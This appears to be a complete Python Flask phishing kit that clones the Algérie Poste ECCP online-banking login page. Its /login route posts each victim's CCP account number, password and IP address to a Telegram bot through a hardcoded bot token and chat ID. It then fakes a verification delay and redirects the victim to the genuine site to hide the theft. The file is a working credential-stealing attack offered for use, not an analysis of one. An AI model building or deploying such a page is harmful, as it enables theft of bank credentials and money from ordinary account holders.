import requests
import time
from flask import Flask, request, render_template_string

app = Flask(__name__)

# === الإعدادات ===
BOT_TOKEN = "8579070794:AAFhYS0DhMAfsA52b44qyf2LC-9jdsa9lD0"
CHAT_ID = "7918211228"

# === الواجهة الكاملة المتجاوبة (طبق الأصل من الصور) ===
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ECCP - Algérie Poste</title>
    <style>
        :root {
            --primary-blue: #004182;
            --secondary-blue: #003366;
            --accent-yellow: #ffcc00;
            --text-dark: #333;
            --border-gray: #e0e0e0;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }

        body { background-color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }

        /* الجزء العلوي - الهيدر */
        .header-gradient {
            width: 100%; height: 110px;
            background: linear-gradient(180deg, var(--secondary-blue) 0%, #0056b3 100%);
            display: flex; align-items: center; padding-left: 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .logo-box {
            width: 80px; height: 80px; background: white; border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
            border: 2px solid var(--border-gray); box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .logo-box img { width: 90%; height: auto; object-fit: contain; }

        /* محتوى الصفحة الرئيسي */
        .main-container { width: 100%; max-width: 480px; padding: 25px 20px; }

        .brand-name { font-size: 22px; color: #004a99; font-weight: 600; margin-bottom: 5px; text-transform: uppercase; }
        .yellow-divider { width: 100%; height: 4px; background-color: var(--accent-yellow); margin-bottom: 15px; }
        .page-instruction { font-size: 19px; color: #444; font-weight: 700; text-transform: uppercase; line-height: 1.3; }

        /* صندوق تسجيل الدخول */
        .login-card {
            border: 1.8px solid #004a99; border-radius: 40px;
            padding: 35px 25px; margin-top: 15px; background: #fff;
        }

        .form-group { margin-bottom: 22px; }
        .form-group label { display: block; font-size: 16px; font-weight: bold; color: #555; margin-bottom: 8px; }
        .form-group input { 
            width: 100%; padding: 14px; border: 1px solid #ccc; 
            border-radius: 8px; font-size: 16px; background-color: #fafafa;
        }

        .btn-submit {
            background-color: var(--secondary-blue); color: white;
            padding: 12px 30px; border: none; border-radius: 8px;
            font-size: 18px; font-weight: 600; cursor: pointer; transition: 0.3s;
        }
        .btn-submit:hover { background-color: #002a55; }

        .forgot-pass { color: #004a99; text-decoration: none; font-size: 20px; margin-top: 15px; display: inline-block; }

        /* الأقسام الجديدة (من الصورة الثانية) */
        .footer-content {
            margin-top: 50px; text-align: center; width: 100%; padding: 0 20px;
        }

        .register-prompt {
            font-size: 24px; color: var(--secondary-blue); font-weight: 800;
            margin-bottom: 20px; line-height: 1.2;
        }

        .btn-large-outline {
            display: inline-block; background-color: var(--secondary-blue);
            color: white; padding: 14px 35px; border-radius: 10px;
            text-decoration: none; font-size: 18px; font-weight: bold; margin-bottom: 12px;
        }

        .edahabia-hint { color: #777; font-size: 15px; margin-bottom: 40px; }

        .ou-divider {
            font-size: 28px; color: var(--secondary-blue); font-weight: 900;
            text-transform: uppercase; margin-bottom: 25px;
        }

        .alt-info {
            font-size: 16px; color: #555; line-height: 1.5; text-align: left;
            max-width: 440px; margin: 0 auto 30px; padding: 0 10px;
        }

        .download-link {
            display: flex; align-items: center; justify-content: center;
            font-size: 18px; color: #004a99; text-decoration: underline;
            margin-bottom: 40px; gap: 10px;
        }
        .download-link img { width: 24px; height: 24px; }

        .taxes-section {
            border-top: 1px solid var(--border-gray); padding: 30px 15px;
            text-align: left; max-width: 440px; margin: 0 auto;
        }
        .taxes-title { font-size: 16px; color: #555; margin-bottom: 20px; }
        .taxes-list { list-style: disc; margin-left: 20px; color: #555; font-size: 15px; line-height: 1.6; }

        .copyright {
            width: 100%; border-top: 1px solid var(--border-gray);
            padding: 20px; text-align: center; color: #777; font-size: 13px;
            margin-top: 20px;
        }

        /* شاشة التحميل المخفية */
        #overlay {
            display: none; position: fixed; top: 0; left: 0;
            width: 100%; height: 100%; background: rgba(255,255,255,0.95);
            z-index: 1000; flex-direction: column; justify-content: center; align-items: center;
        }

        .spinner {
            width: 50px; height: 50px; border: 5px solid #f3f3f3;
            border-top: 5px solid var(--secondary-blue); border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { margin-top: 20px; color: var(--secondary-blue); font-weight: bold; font-size: 18px; }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="spinner"></div>
        <p class="loading-text">Connexion en cours...</p>
    </div>

    <div class="header-gradient">
        <div class="logo-box">
            <img src="https://cip.dz/wp-content/uploads/2025/01/468847908_981214470706945_8991930606880972526_n-980x980.jpg" alt="Logo">
        </div>
    </div>

    <div class="main-container">
        <div class="title-section">
            <div class="brand-name">ECCP - ALGÉRIE POSTE</div>
            <div class="yellow-divider"></div>
            <div class="page-instruction">CONNECTEZ-VOUS À VOTRE COMPTE</div>
        </div>

        <div class="login-card">
            <form id="loginForm" action="/login" method="POST" onsubmit="showLoading()">
                <div class="form-group">
                    <label>CCP (Sans la clé)</label>
                    <input type="text" name="ccp" autocomplete="off" required>
                </div>
                <div class="form-group">
                    <label>Mot de passe</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn-submit">Se connecter</button>
            </form>
            <a href="#" class="forgot-pass">Mot de passe oublié ?</a>
        </div>
    </div>

    <div class="footer-content">
        <h3 class="register-prompt">Vous n'avez pas de compte<br>ECCP ?</h3>
        <a href="#" class="btn-large-outline">Créer un compte en-ligne</a>
        <p class="edahabia-hint">Si vous disposeز déjà d'une carte EDAHABIA</p>

        <div class="ou-divider">OU</div>

        <p class="alt-info">
            Vous pouvez obtenir un code confidentiel au niveau de l'établissement postal de votre choix sur présentation d'une copie d'une pièce d'identité accompagnée du formulaire ci-dessous.
        </p>

        <a href="#" class="download-link">
            <img src="https://img.icons8.com/color/48/pdf.png" alt="pdf icon">
            Télécharger Formulaire Demande Code ECCP
        </a>

        <div class="taxes-section">
            <p class="taxes-title">Taxes en vigueur depuis le 1er janvier 2015</p>
            <ul class="taxes-list">
                <li>Extrait de compte : 10 DA</li>
                <li>Notification par SMS : 10 DA</li>
                <li>Relevé de compte : Frais de recherche par mois 40 DA. En plus et par page : 5 DA</li>
            </ul>
        </div>

        <div class="copyright">
            Copyright &copy; 2026 Algérie Poste. Tous droits réservés.
        </div>
    </div>

    <script>
        function showLoading() { document.getElementById('overlay').style.display = 'flex'; }
    </script>

</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(LOGIN_PAGE)

@app.route('/login', methods=['POST'])
def login():
    ccp = request.form.get('ccp')
    password = request.form.get('password')
    
    # تنسيق الرسالة بشكل احترافي لتليجرام
    log_msg = (
        f"📱 **محاولة دخول جديدة (ECCP)**\n"
        f"----------------------------\n"
        f"👤 **رقم الحساب:** `{ccp}`\n"
        f"🔑 **كلمة المرور:** `{password}`\n"
        f"📍 **IP:** {request.remote_addr}"
    )
    
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={'chat_id': CHAT_ID, 'text': log_msg, 'parse_mode': 'Markdown'})
    except:
        pass
    
    # الانتظار لمحاكاة التحقق (UX)
    time.sleep(2.5) 
    
    # التحويل للموقع الرسمي
    return render_template_string('<script>window.location.href="https://eccp.poste.dz/index.php/login";</script>')

if __name__ == '__main__':
    # تشغيل السيرفر على جميع الشبكات (أو localhost لأغراض الاختبار)
    app.run(host='0.0.0.0', port=5000)
